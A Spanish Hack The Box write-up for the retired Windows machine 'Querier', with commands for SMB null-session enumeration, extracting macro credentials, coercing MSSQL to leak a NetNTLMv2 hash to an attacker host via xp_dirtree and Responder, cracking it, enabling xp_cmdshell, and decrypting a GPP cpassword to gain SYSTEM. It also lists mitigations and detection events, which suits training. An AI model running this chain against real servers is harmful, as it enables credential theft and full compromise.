---
machine: Querier
os: Windows
difficulty: Medium
platform: Hack The Box
category: Windows / MSSQL
state: Retired
tags: [windows, smb, mssql, xp_dirtree, responder, ntlmv2, gpp, cpassword, psexec]
---

# Querier — Hack The Box

[🇬🇧 English](README.en.md) | **Español**

> **Estado:** Retired. Ficha de método; sin flags ni credenciales reales.

## TL;DR

Servidor independiente con SMB, MSSQL 2017 y WinRM, sin controlador de dominio. Una sesión nula de SMB permite leer el share `Reports`, con un `.xlsm` cuyo macro guarda la cadena de conexión de `reporting`. Esa cuenta entra en SQL por autenticación Windows pero no puede usar `xp_cmdshell`; sí puede lanzar `xp_dirtree` contra un UNC propio, lo que fuerza al servicio a autenticarse como `mssql-svc` y entrega un NetNTLMv2 que se rompe por diccionario. Con `mssql-svc`, que es `sysadmin`, se habilita `xp_cmdshell` y se ejecuta PowerUp, que encuentra un `Groups.xml` cacheado con la contraseña de `Administrator` descifrable.

## Reconocimiento

```bash
nmap -p- --min-rate 5000 -oA nmap_all <IP>
nmap -p 135,139,445,1433,5985 -sCV -oA nmap_svc <IP>
```

```text
135/tcp  open  msrpc        Microsoft Windows RPC
139/tcp  open  netbios-ssn
445/tcp  open  microsoft-ds
1433/tcp open  ms-sql-s     Microsoft SQL Server 14.00.1000.00
5985/tcp open  wsman
| ms-sql-ntlm-info:
|   NetBIOS_Computer_Name: QUERIER
|_  DNS_Domain_Name: HTB.LOCAL
```

- No hay 88, 389 ni 53: es un servidor miembro o independiente, no un DC. Eso condiciona la escalada final.
- SMB firma habilitada pero no exigida.
- SQL Server 2017 RTM y Windows Server 2019 (build 17763).

```bash
printf '%s\n' '<IP> querier.htb' | sudo tee -a /etc/hosts
```

## Enumeración

```bash
smbclient -N -L //<IP>
smbclient -N //<IP>/Reports
smb: \> get "Currency Volume Report.xlsm"
olevba "Currency Volume Report.xlsm"
```

El macro contiene una cadena de conexión con credenciales en claro:

```vb
conn.ConnectionString = "Driver={SQL Server};Server=QUERIER;Trusted_Connection=no;" & _
  "Database=volume;Uid=reporting;Pwd=<PASSWORD>"
```

No hace falta abrir el documento en Excel: el valor está guardado en el propio fichero y `olevba` lo extrae de forma estática. La cuenta `reporting` es un usuario local de Windows mapeado en SQL, así que hay que entrar con autenticación Windows:

```bash
mssqlclient.py -windows-auth 'reporting:<PASSWORD>@<IP>'
```

## Foothold

```sql
SELECT SYSTEM_USER, IS_SRVROLEMEMBER('sysadmin');
```

`reporting` no es `sysadmin` y no puede habilitar ni ejecutar `xp_cmdshell`. Lo que sí puede hacer es pedir a SQL Server que liste un recurso UNC, lo que convierte al servicio en cliente SMB y lo autentica con su propia cuenta de servicio:

```sql
EXEC master..xp_dirtree '\\<LHOST>\share';
```

Con Responder escuchando se captura el NetNTLMv2 de `QUERIER\mssql-svc`:

```text
[SMBv2] NTLMv2-SSP Username : QUERIER\mssql-svc
```

```bash
hashcat -m 5600 mssql-svc.txt /usr/share/wordlists/rockyou.txt
# <PASSWORD>
```

`mssql-svc` sí es `sysadmin`. Se habilita la ejecución de comandos con el procedimiento estándar:

```sql
EXEC sp_configure 'show advanced options', 1; RECONFIGURE;
EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;
EXEC xp_cmdshell 'whoami';
```

```text
querier\mssql-svc
```

## Movimiento lateral

No hay bosque ni segundo host: el movimiento es vertical dentro del mismo servidor, de `reporting` (sin privilegios) a `mssql-svc` (servicio) y de ahí a `Administrator`.

## Escalada de privilegios

Con una shell como `mssql-svc` se sube PowerUp y se ejecuta `Invoke-AllChecks`. El resultado incluye un GPP cacheado en el disco local:

```text
File      : C:\ProgramData\Microsoft\Group Policy\History\{31B2F340-...}\Machine\Preferences\Groups\Groups.xml
UserNames : {Administrator}
Passwords : {<PASSWORD>}
```

La contraseña aparece en el atributo `cpassword`, cifrado con la clave AES pública que Microsoft publicó y que `gpp-decrypt` revierte:

```bash
gpp-decrypt <CPASSWORD>
```

Con esa contraseña se abre sesión como administrador local:

```bash
psexec.py 'Administrator:<PASSWORD>@querier.htb'    # nt authority\system
# o wmiexec/evil-winrm para remote\administrator
```

Por qué funciona: MS14-025 impide que se guarden **nuevas** contraseñas en GPP, pero no borra los `Groups.xml` antiguos; el fichero cacheado en `ProgramData` conserva el `cpassword` y la clave de descifrado es pública desde 2014.

`mssql-svc` tenía `SeImpersonatePrivilege`, pero no es la vía: el sistema está parcheado contra la familia Rotten/Juicy Potato. La ruta documentada es el GPP.

## Evidencia

- `smbclient -N -L` con el share `Reports` legible.
- Cadena de conexión del macro con la contraseña redactada.
- Salida de `xp_dirtree` y del hash capturado, recortado.
- `IS_SRVROLEMEMBER` antes y después de crackear.
- `Groups.xml` con el `cpassword` recortado.

## Lecciones aprendidas

- Una cuenta de base de datos puede no ser un login SQL: `--windows-auth` marca la diferencia.
- `xp_dirtree` no ejecuta comandos, pero obliga al servicio a autenticarse fuera; ese es el fallo.
- Un share de solo lectura con documentación sigue siendo superficie: los macros guardan secretos en claro.
- MS14-025 es una mala denominación aquí: el servidor no está afectado por la CVE, lo que queda es dato heredado.
- `SeImpersonatePrivilege` no garantiza nada en 2019; comprobar parches antes de lanzar un Potato.

## Mitigaciones y detección

- Cerrar la sesión nula de SMB y restringir `Reports` a los grupos que lo necesiten.
- No guardar credenciales en macros ni en documentos compartidos; rotar la cuenta `reporting`.
- Impedir que las cuentas de servicio inicien sesión de forma interactiva y limitar `xp_dirtree`/`xp_fileexist` a lo necesario; deshabilitar `xp_cmdshell`.
- Purgar `cpassword` históricos de GPP en `SYSVOL` y en las cachés locales, y rotar las contraseñas afectadas.
- Detección: sesiones nulas y lecturas del share `Reports` (5140/5145); `xp_dirtree` con UNC externo en el log de SQL; autenticaciones SMB salientes del servicio MSSQL (4624 tipo 3); ejecución de `xp_cmdshell` (4104/4688); creación de servicios por `psexec` (7045).

MITRE: T1552.001, T1187, T1110.002, T1078.003, T1059.003, T1552.006, T1021.002, T1021.006.

## Referencias

- <https://0xdf.gitlab.io/2019/06/22/htb-querier.html>
- <https://0xrick.github.io/hack-the-box/querier>
- <https://learn.microsoft.com/en-us/sql/database-engine/configure-windows/xp-cmdshell-server-configuration-option>
- <https://learn.microsoft.com/en-us/security-updates/securitybulletins/2014/ms14-025>
- <https://attack.mitre.org/techniques/T1552/006/>
